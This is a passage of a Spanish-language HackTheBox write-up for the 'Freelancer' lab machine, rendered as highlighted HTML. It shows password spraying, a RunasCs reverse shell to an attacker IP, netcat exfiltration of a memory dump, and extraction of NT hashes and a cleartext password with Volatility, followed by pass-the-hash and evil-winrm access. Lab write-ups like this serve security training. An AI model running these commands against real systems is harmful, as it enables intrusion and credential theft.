+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>ophia.h:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>ql_svc:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\S</span>QLBackupOperator:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>shd:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\t</span>aylor:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\w</span>walker:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+</span></span></code></pre></div><p>Y como me imaginaba.
+<code>mikasaAckerman:IL0v3ErenY3ager</code></p>
+<p>Este usuario no está en el grupo <code>Remote Management Users</code>, voy a tener que utilizar <code>RunasCs.exe</code> para poder pivotar.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc winrm 10.129.230.3 -u mikasaAckerman -p <span style="color:#e6db74">&#39;IL0v3ErenY3ager&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.230.3    <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:freelancer.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.230.3    <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\m</span>ikasaAckerman:IL0v3ErenY3ager
+</span></span></code></pre></div><p>Nos compartimos el ejecutable&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\sql_svc\Desktop&gt; iwr http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8081</span>/RunasCs.exe -o RunasCs.exe
+</span></span></code></pre></div><p>Nos ponemos en escucha con <code>netcat</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y nos mandamos la revshell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\sql_svc\Desktop&gt; .\RunasCs.exe mikasaackerman IL0v3ErenY3ager cmd.exe -r <span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Running <span style="color:#66d9ef">in</span> session <span style="color:#ae81ff">0</span> with <span style="color:#66d9ef">process</span> <span style="color:#66d9ef">function</span> CreateProcessWithLogonW()
+</span></span><span style="display:flex;"><span>[+] Using Station\Desktop<span style="color:#960050;background-color:#1e0010">:</span> Service-0x0-<span style="color:#ae81ff">515e8</span>$\<span style="color:#66d9ef">Default</span>
+</span></span><span style="display:flex;"><span>[+] Async <span style="color:#66d9ef">process</span> <span style="color:#e6db74">&#39;C:\WINDOWS\system32\cmd.exe&#39;</span> with pid <span style="color:#ae81ff">4424</span> created <span style="color:#66d9ef">in</span> background.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.3<span style="color:#f92672">]</span> <span style="color:#ae81ff">61595</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.5830<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>freelancer<span style="color:#ae81ff">\m</span>ikasaackerman
+</span></span></code></pre></div><p>En el escritorio de este usuario podemos ver la flag y unos archivos interesantes&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\mikasaAckerman\Desktop&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume <span style="color:#66d9ef">in</span> drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is <span style="color:#ae81ff">8954</span>-28AE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Users\mikasaAckerman\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2024</span>  <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span> AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2024</span>  <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span> AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2023</span>  <span style="color:#ae81ff">06</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">23</span> PM             <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">468</span> mail.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span>/<span style="color:#ae81ff">04</span>/<span style="color:#ae81ff">2023</span>  <span style="color:#ae81ff">01</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">47</span> PM       <span style="color:#ae81ff">292</span>,<span style="color:#ae81ff">692</span>,<span style="color:#ae81ff">678</span> MEMORY.7z
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span>/<span style="color:#ae81ff">05</span>/<span style="color:#ae81ff">2024</span>  <span style="color:#ae81ff">06</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11</span> AM                <span style="color:#ae81ff">34</span> user.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> File(s)    <span style="color:#ae81ff">292</span>,<span style="color:#ae81ff">694</span>,<span style="color:#ae81ff">180</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir(s)   <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">597</span>,<span style="color:#ae81ff">232</span>,<span style="color:#ae81ff">640</span> bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\mikasaAckerman\Desktop&gt;type user.txt
+</span></span><span style="display:flex;"><span>type user.txt
+</span></span><span style="display:flex;"><span>9cd7c949484af8....
+</span></span></code></pre></div><h1 id="user-pivoting-2">User Pivoting 2</h1>
+<p>El archivo <code>mail.txt</code> tiene el siguiente contenido.</p>
+<pre tabindex="0"><code>Hello Mikasa,
+I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &#34;DATACENTER-2019&#34; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
+I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&#39;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
+Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
+Best regards
+</code></pre><p>Leyendo el email nos damos cuenta de que tenemos un dumpeo de memoria del servidor. Esto puede ser muy útil para poder extraer credenciales, vamos a ver como.</p>
+<p>Primero quiero tener este comprimido en mi máquina, me comparto <code>netcat</code> y con ello me comparto el comprimido.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\mikasaAckerman\Desktop<span style="color:#75715e">&gt;cmd.exe /c &#34;nc.exe 10.10.14.18 443 &lt; MEMORY.7z&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nc -lvnp <span style="color:#ae81ff">443</span> &gt; MEMORY.7z
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.3<span style="color:#f92672">]</span> <span style="color:#ae81ff">63844</span>
+</span></span></code></pre></div><p>Como el archivo pesa bastante, dejemos un rato el archivo compartiéndose.</p>
+<p>Para saber cuando terminó, podemos con <code>Get-FileHash</code> calcular el hash MD5 original del archivo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\mikasaAckerman\Desktop<span style="color:#75715e">&gt;powershell Get-FileHash .\MEMORY.7z -Algorithm MD5</span>
+</span></span><span style="display:flex;"><span>powershell Get-FileHash .\MEMORY.7z -Algorithm MD5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Algorithm       Hash                                                                   Path                            
+</span></span><span style="display:flex;"><span>---------       ----                                                                   ----                            
+</span></span><span style="display:flex;"><span>MD5             931386993AB32B37692FDE69E8FF389F                                       C:\Users\mikasaAckerman\Deskt...
+</span></span></code></pre></div><p>Y en nuestra máquina, <strong>MIENTRAS</strong> se está compartiendo, ir calculando de vez el cuando el hash MD5, cuando coincida significa que la transmisión del archivo habrá terminado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ md5sum MEMORY.7z 
+</span></span><span style="display:flex;"><span>47f51df9d1a469be9ac0db604ac5df56  MEMORY.7z
+</span></span></code></pre></div><p>Una vez tengamos el comprimido, podemos listar su contenido.
+Contiene un archivo <code>MEMORY.DMP</code>.</p>
+<p>Con mimikatz podemos utilizar el módulo <code>sekurlsa::minidump</code> para pasarle un archivo .dmp donde se encuentre una instancia de <code>lsass.exe</code></p>
+<p>Esto no se puede hacer con un dumpeo de la memoria completa. Por lo cual, con <code>volatility3</code> voy a extraer el proceso de <code>lsass.exe</code> para luego con <code>mimikatz</code> extraer los hashes de la <code>SAM</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo vol -f MEMORY.DMP windows.info
+</span></span></code></pre></div><p>Ahora enumeramos los procesos</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo vol -f MEMORY.DMP windows.pslist.PsList
+</span></span></code></pre></div><p>Y encontramos el <code>lsass.exe</code></p>
+<pre tabindex="0"><code>584	456	lsass.exe	0xbc83a93e7080	9	-	0	False	2023-10-04 17:30:06.000000 	N/A	Disabled
+</code></pre><p>Ahora con el módulo de <code>memmap</code> podemos dumpear un proceso seleccionando su PID, en este caso, 584.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo vol -f MEMORY.DMP windows.memmap.Memmap --pid <span style="color:#ae81ff">584</span> --dump
+</span></span></code></pre></div><p>**PARA POINTED, SEGURO QUE HAY ALGUNA MANERA MEJOR Y MAS RÁPIDO PARA HACERLO</p>
+<p>Efectivamente, me di cuenta de lo que estaba haciendo y de porqué.</p>
+<p>Esto se solía hacer con <code>volatility2</code> pero <code>volatility3</code> tiene módulos para interactuar con LSASS y dumpear credenciales.
+Módulos como <code>windows.lsadump</code> o <code>windows.hashdump</code>.
+Gracias por este &ldquo;issue&rdquo; abierto en Github.
+<a href="https://github.com/volatilityfoundation/volatility3/issues/1102">https://github.com/volatilityfoundation/volatility3/issues/1102</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo vol -f MEMORY.DMP windows.hashdump
+</span></span><span style="display:flex;"><span>Volatility <span style="color:#ae81ff">3</span> Framework 1.0.1
+</span></span><span style="display:flex;"><span>Progress:  100.00		PDB scanning finished                                
+</span></span><span style="display:flex;"><span>User	rid	lmhash	nthash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Administrator	500	aad3b435b51404eeaad3b435b51404ee	725180474a181356e53f4fe3dffac527
+</span></span><span style="display:flex;"><span>Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+</span></span><span style="display:flex;"><span>DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+</span></span><span style="display:flex;"><span>WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	04fc56dd3ee3165e966ed04ea791d7a7
+</span></span></code></pre></div><p>Intenté hacer Pass The Hash a la cuenta de <code>Administrator</code> pero no era válido.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.230.3 -u <span style="color:#e6db74">&#39;Administrator&#39;</span> --aesKey <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:freelancer.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\A</span>dministrator:aad3b435b51404eeaad3b435b51404ee KDC_ERR_PREAUTH_FAILED
+</span></span></code></pre></div><p>Utilizando el módulo <code>windows.lsadump</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo vol -f MEMORY.DMP windows.lsadump
+</span></span></code></pre></div><p>¡Vemos una credencial!
+<img src="images/Screenshot_32.png" alt="Write-up Image"></p>
+<p>Como no sabía para que usuario podría ser esta credencial, con <code>netexec</code> hice Password Spraying a todos los usuarios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.230.3 -u users.txt -p <span style="color:#e6db74">&#39;PWN3D#l0rr@Armessa199&#39;</span> --continue-on-success
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:freelancer.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\a</span>dministrator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\a</span>lex.hill:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\c</span>arol.poland:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\d</span>.jones:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\d</span>thomas:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\e</span>reed:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\E</span>than.l:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\e</span>velyn.adams:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\G</span>uest:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\h</span>king:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\j</span>en.brown:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\j</span>green:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\j</span>martinez:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\k</span>rbtgt:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\l</span>eon.sk:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\l</span>kazanof:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\l</span>orra199:PWN3D#l0rr@Armessa199
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\m</span>aya.artmes:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\m</span>ichael.williams:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\m</span>ikasaAckerman:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\o</span>livia.garcia:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>amuel.turner:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>davis:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>ophia.h:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>ql_svc:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\S</span>QLBackupOperator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\s</span>shd:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\t</span>aylor:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.230.3    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\w</span>walker:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE
+</span></span></code></pre></div><p><code>freelancer.htb\lorra199:PWN3D#l0rr@Armessa199</code></p>
+<p>Y vemos que este usuario está en el grupo de <code>Remote Management Users</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc winrm 10.129.230.3 -u <span style="color:#e6db74">&#39;lorra199&#39;</span> -p <span style="color:#e6db74">&#39;PWN3D#l0rr@Armessa199&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.230.3    <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:freelancer.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.230.3    <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> freelancer.htb<span style="color:#ae81ff">\l</span>orra199:PWN3D#l0rr@Armessa199 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Así que con <code>evil-winrm</code> podemos conectarnos a la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> evil-winrm -i <span style="color:#ae81ff">10.129</span>.230.3 -u lorra199 -p <span style="color:#e6db74">&#39;PWN3D#l0rr@Armessa199&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.5
+</span></span><span style="display:flex;"><span>                                        
